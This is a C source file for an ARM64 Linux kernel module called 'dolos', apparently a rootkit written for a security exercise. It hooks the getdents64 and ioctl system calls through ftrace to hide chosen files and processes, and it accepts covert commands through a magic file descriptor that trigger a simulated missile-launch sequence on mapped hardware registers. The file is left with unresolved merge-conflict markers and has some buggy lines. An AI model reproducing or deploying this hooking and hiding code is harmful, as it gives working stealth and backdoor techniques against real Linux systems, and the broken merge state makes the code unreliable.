#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
<<<<<<< HEAD
#include <linux/kprobes.h>//
=======
#include <linux/kprobes.h>
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
#include <linux/ftrace.h>
#include <asm/cacheflush.h>
#include <linux/module.h>
#include <linux/fprobe.h>
#include <linux/errno.h>
#include <linux/ftrace.h>
#include <linux/delay.h>
<<<<<<< HEAD
=======
#include <linux/string.h>
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549

MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

#ifndef DEBUG
#define DEBUG 1
#endif
#define MAX_NAME 256
#define ROOTKIT -1877
#define SENDPID 8008
#define RATSIGLAUNCH 8675309
#define CHECKUP 80085
#define GOODRET 42
#define HIDEFILE 1234
<<<<<<< HEAD

=======
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
/* A simple debug print macro that will be compiled out if not defined */
  /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
#define debug_print(fmt, args...)\
    do { if (DEBUG) pr_warn(fmt, ##args); } while(0)
<<<<<<< HEAD

bool gotime = false;
char pid[MAX_NAME];
=======
    
#define MAX_NAME 256


typedef asmlinkage long (*orig_ioctl_t)(const struct pt_regs *);
typedef asmlinkage int (*orig_getdents64_t)(const struct pt_regs *);

orig_ioctl_t orig_ioctl;
orig_getdents64_t orig_getdents64;

bool gotime = false;
bool launch = false;
char pid[MAX_NAME];
char lpid[MAX_NAME];
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
char filename[MAX_NAME];
bool rfilename = false;
bool rpid = false;

typedef struct Registers {
	unsigned int status;
	unsigned int reserved0;
	unsigned int command;
	unsigned int reserved1;
	unsigned int data;
	unsigned int reserved2;
}Registers;

typedef struct RegisterMap {
	Registers * hatch;
	Registers * bd;
	Registers * wl;
	Registers * rl;
	Registers * mr;
	Registers * tc;
	Registers * lc;
	uint8_t * tcbuf;
	uint8_t * lcbuf;
}RegisterMap;

RegisterMap *reg_map1;
RegisterMap *rm;

<<<<<<< HEAD
typedef asmlinkage long (*orig_syscall_t)(const struct pt_regs *);

orig_syscall_t orig_ioctl;

const char *HIDE_DIR = "dolos";

=======
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
struct ftrace_hook {
    const char *name;
    void * function;
    void * original;
    struct ftrace_ops ops;
};

#define HOOK(_name, _function, _original)   \
    {                                       \
        .name = (_name),                    \
        .function = (_function),             \
        .original = (_original),             \
    }

<<<<<<< HEAD
static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
/* When an ftraced function gets called, this is our generic handler. It will call our version of the hooked function */
{	
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook * fhook = op->private;
=======
int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret);

// Generic handler for any function we want to hook
// Simple check to prevent getting in a loop
// Check if we are calling from our own module, don't do hook
// Otherwise set ip to our own private counter
static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
/* When an ftraced function gets called, this is our generic handler. It will call our version of the hooked function */
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook * fhook = op->private; // data we can pass in
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
    /* Since we will call the original function again we need to make sure we don't end up in a loop
     * Check to see if our module is the caller of the original. If yes, don't change PC
     */
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->pc = (unsigned long) fhook->function;
    }
}

<<<<<<< HEAD

static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);


/* set registers & determine hook*/
=======
static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);

/* Hook to hide directories/files */
static asmlinkage int dolos_getdents64(struct pt_regs *regs) {
    int check;
    // We want the output of the original getdents64
    int orig_ret = orig_getdents64(regs);
    
    // Return original if error or we do not have the pid or filename yet
    if (orig_ret <= 0 || (!rpid && !rfilename)) { // Error -> errno already set
    	return orig_ret;
    }
    
    struct linux_dirent64 *ker_dirent;
    ker_dirent = (struct linux_dirent64 *)kzalloc(orig_ret, GFP_KERNEL); // zero out mem for ker_dirent  

    check = copy_from_user(ker_dirent, regs->regs[1], orig_ret); // Copy buffer into kernel mem
    unsigned int count = 0;
    count = regs->regs[2];
    
    if (ker_dirent->d_reclen == 0) {
    	kfree(ker_dirent);
    	return orig_ret;
    }

    int bytes_to_return = malicious_getdents64(ker_dirent, &count, orig_ret);

    // If we changed anything, ensure we copy out our data
    if (bytes_to_return != orig_ret) {
        memset(regs->regs[1], 0, orig_ret); // Zero out buffer in userspace
        check = copy_to_user(regs->regs[1], ker_dirent, bytes_to_return); // Copy buffer to userspace
        regs->regs[2] = count; // Update the correct count
    }

    kfree(ker_dirent); // Free kernel mem
    return bytes_to_return;
}

int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret)
{
    int bytes_to_return = orig_ret;
    unsigned long offset = 0;

    char* ptr = (char*)ker_dirent; // Our current pointer in the buffer
    bool hideFlag = false;
    struct linux_dirent64 *curr = NULL;
    struct linux_dirent64 *winner = NULL;

    // Look through dirent structure to find the directories/files we want to hide
    while(offset < orig_ret) {
        ptr = (char*)ker_dirent + offset;
        curr = (struct linux_dirent64*)ptr; // Our current pointer in the buffer

        if (curr->d_reclen == 0)  {
            return bytes_to_return;
        }

        if(rfilename && (strcmp(filename, curr->d_name)==0)) {
            hideFlag = true;
            winner = curr;
            break;
        
        } else if(rpid && ((strcmp(pid, curr->d_name)==0) || (strcmp(lpid, curr->d_name)==0))) {
            hideFlag = true;
            winner = curr;
            break;
	}
        offset += curr->d_reclen; // Go to next dirent
    }
    if(hideFlag) {
    	    char* next = (char *)curr + curr->d_reclen;
    	    bytes_to_return -= curr->d_reclen;
	    memmove(winner, next, bytes_to_return - offset); // Shift buffer down
    }
    return bytes_to_return;
}


>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
static asmlinkage long dolos_ioctl(struct pt_regs *regs)
{
    /* ioctl(unsigned int fd, unsigned int cmd, unsigned long arg) */
    int ret = 0;
    unsigned int fd = regs->regs[0];
    unsigned int cmd = regs->regs[1];
    unsigned long arg;
    if (regs->regs[2] != NULL) {
        arg = regs->regs[2];
    }

        if (fd == ROOTKIT) { // Our creators are talking to us
                if (cmd == SENDPID) { // pid
<<<<<<< HEAD
                        sprintf(pid, "%ld", arg);
=======
                        sprintf(pid, "/proc/%d", arg);
			            sprintf(lpid, "%d", arg);
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
                        return GOODRET;

                } else if (cmd == HIDEFILE) {
                        __arch_copy_from_user(filename, (char *)arg, sizeof(((char*)arg)));
                        return GOODRET;

                } else if (cmd == RATSIGLAUNCH) { // CWEs ASSEMBLE
<<<<<<< HEAD
			gotime = true;
=======
			            gotime = true;
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
                        return GOODRET;
                
		} else if (cmd == CHECKUP) {
			return GOODRET;
		
		} else {
			return 0;
		}
        }

    if (gotime && cmd == 0x195) {
        unsigned long *kernel_argp;
        /* FIXME: UNCOMMENT whole block
        
        // copy_from_user(dest, source, size)
        __n = __arch_copy_from_user(&kernel_argp,arg & 0xff7fffffffffffff,4); // Copy launch code
        if (__n != 0) {
            debug_print("copy from user FAILED.\n");
            ret = orig_ioctl(regs);
        } 
        else {
            malicious_ioctl(arg, *kernel_argp);
        }
        // ......... stop uncommenting from fixme here ............
        */
        malicious_ioctl(arg, kernel_argp);
    }

    else {
        // pass to original function
        // debug_print("cmd does not equal 0x195.\nPass to original ioctl function...\n");
        ret = orig_ioctl(regs);
    }
    return ret;

}

static void map_regions(void) {
  unsigned long addr1;
  char cVar4;
  Registers *pRVar5;
  uint8_t *puVar6;
  unsigned long uVar7;

  uVar7 = 0x68000000000713;
  rm = (RegisterMap *)kmalloc(0x8000,0x48);
  uint8_t *buf = (uint8_t *)vmalloc(0x4000);
  reg_map1 = rm;
  addr1 = uVar7;
  if (arm64_use_ng_mappings != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080120,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->hatch = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080100,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->bd = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080200,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->wl = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080220,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->rl = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080240,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->mr = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080260,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->tc = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080280,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->lc = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  puVar6 = (uint8_t *)ioremap(0x60081000,0x4000);
  cVar4 = arm64_use_ng_mappings;
  RegisterMap *pRVar3 = rm;
  reg_map1->tcbuf = puVar6;
  if (cVar4 != '\0') {
    uVar7 = 0x68000000000f13;
  }
  puVar6 = (uint8_t *)ioremap(0x60085000,0x4000);
  pRVar3->lcbuf = puVar6;
  return;
}

<<<<<<< HEAD

=======
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
{

        debug_print("\n\nmalicious_ioctl function called.\n\n");

        map_regions(); // Map our register map
        
        int timeLimit = 10;

        // Set missile startup
        while(rm->mr->status != 6 && timeLimit > 0) {
            rm->mr->data = kernel_argp;
            rm->mr->command = 4;
            timeLimit --;
            msleep(500);
        }

        // turn on lights
	    rm->rl->command = 1;
        msleep(2000);
        debug_print("\n lights on. \n");

        // close blast door
        rm->bd->command = 2;
        timeLimit = 80;
        while(rm->bd->status != 2 && timeLimit > 0) {
            msleep(100);
            timeLimit --;
        }
        debug_print("\n blast door closed. \n");

        // open hatch
        timeLimit = 80;
        rm->hatch->command = 1;
        while(rm->hatch->status != 1 && timeLimit > 0) {
            msleep(100);
            timeLimit --;
        }
        debug_print("\n hatch opened. \n");

        // get missile ready for launch
	    timeLimit = 200;
	    rm->mr->command = 1;
	    while(rm->mr->status != 3 && timeLimit > 0) {
	    	msleep(100);
	    	timeLimit --;
	    }
        debug_print("\n missile ready for launch. \n");

        // shut hatch
        timeLimit = 80;
        rm->hatch->command = 2;
        while(rm->hatch->status != 2 && timeLimit > 0) {
            msleep(100);
            timeLimit --;
        }
        debug_print("\n HATCH CLOSED. \n");

        // open blastdoor
        rm->bd->command = 1;
        // kill lights
        rm->rl->command = 2;
        rm->wl->command = 2;
        timeLimit = 80;
        while(rm->bd->status != 1 && timeLimit > 0) {
            msleep(100);
            timeLimit --;
        }
        debug_print("\n blastdoor opened & lights killed. \n");


        // launch the missile
	    rm->mr->command = 3;
        debug_print("\n MISSILE LAUNCHED. \n");

	
	return;
	
}

<<<<<<< HEAD

=======
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
struct ftrace_ops ops = {
    .func = dolos_ftrace_stub,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY
};

static unsigned long lookup_name(const char *name)
{
    /* kallsyms_lookup_name was a function that used to be exported.
     * See discussion here for why is was removed https://lwn.net/Articles/813350/
     * Now we can use a kprobe to find the address of "any" symbol
     * https://docs.kernel.org/trace/kprobes.html
     */
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long addr;
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

<<<<<<< HEAD
static int install_hook(struct ftrace_hook* hook)
=======
static int install_hook(struct ftrace_hook* hook) // install ftrace hook
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
{
    int ret = 0;
    /* lookup the original symbol */
    unsigned long address = lookup_name(hook->name);
    /* save it to the hook struct */
    *(unsigned long *) hook->original = address;

    debug_print("hook address at %lx\n", address);
    if (address == 0)
    {
        debug_print("Failed to find symbol %s\n", hook->name);
        ret = 1;
        return ret;
    }
    hook->ops.func = dolos_ftrace_stub;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
    hook->ops.private = hook;
<<<<<<< HEAD

    ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0);
=======
    ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0); // pass ops structure and address we want to hook, sometimes more than one function has the same name, pass ip for accuracy
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
    if (ret) {
        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
        return ret;
    }
    ret = register_ftrace_function(&hook->ops);
    if (ret) {
        debug_print("register_ftrace_function %d\n", ret);
        ftrace_set_filter_ip(&hook->ops, address, 1, 0);
    }
    return ret;
}

static void remove_hook(struct ftrace_hook* hook)
{
    int ret;
    ret = unregister_ftrace_function(&hook->ops);
    if (ret) {
        debug_print("unregister_ftrace_function failed: %d\n", ret);
    }
    ret = ftrace_set_filter_ip(&hook->ops, *((unsigned long *) hook->original), 1, 0);
    if (ret) {
        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
    }
}

<<<<<<< HEAD
static int install_hooks(struct ftrace_hook *hooks, size_t count)
=======
static int install_hooks(struct ftrace_hook *hooks, size_t count) // look through array of hooks
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
{
    size_t i;
    int ret = 0;

    for (i = 0; i < count; i++) {
        ret = install_hook(&hooks[i]);
        if (ret)
        {
            goto error;
        }
    }

    return 0;
error:
    while (i!=0) {
        remove_hook(&hooks[--i]);
    }
    return ret;
}

static void remove_hooks(struct ftrace_hook * hooks, size_t count)
{
    size_t i;
    for (i = 0; i < count; i++)
    {
        remove_hook(&hooks[i]);
    }
}

<<<<<<< HEAD

/* an array of functions we want to hook */
static struct ftrace_hook hooks[] = {
    HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),

=======
/* an array of functions we want to hook */
static struct ftrace_hook hooks[] = {
    HOOK("__arm64_sys_getdents64", dolos_getdents64, &orig_getdents64),
    HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
};


static int __init dolos_init(void)
/* called on module load */
{
    int ret = 0;
    ret = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret) {
        debug_print("failed to load: %d\n", ret);
        return ret;
    }
    debug_print("Loaded\n");
<<<<<<< HEAD
=======
    
>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549

    return 0;
}

static void __exit dolos_exit(void)
/* called on module exit */
{
    int err;
    err = 0;
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    debug_print("unloaded\n");
}

/* register our init and exit functions */
module_init(dolos_init);
module_exit(dolos_exit);
<<<<<<< HEAD
=======

>>>>>>> ca132add3f76b058b8819e53b5baa50f268c4549
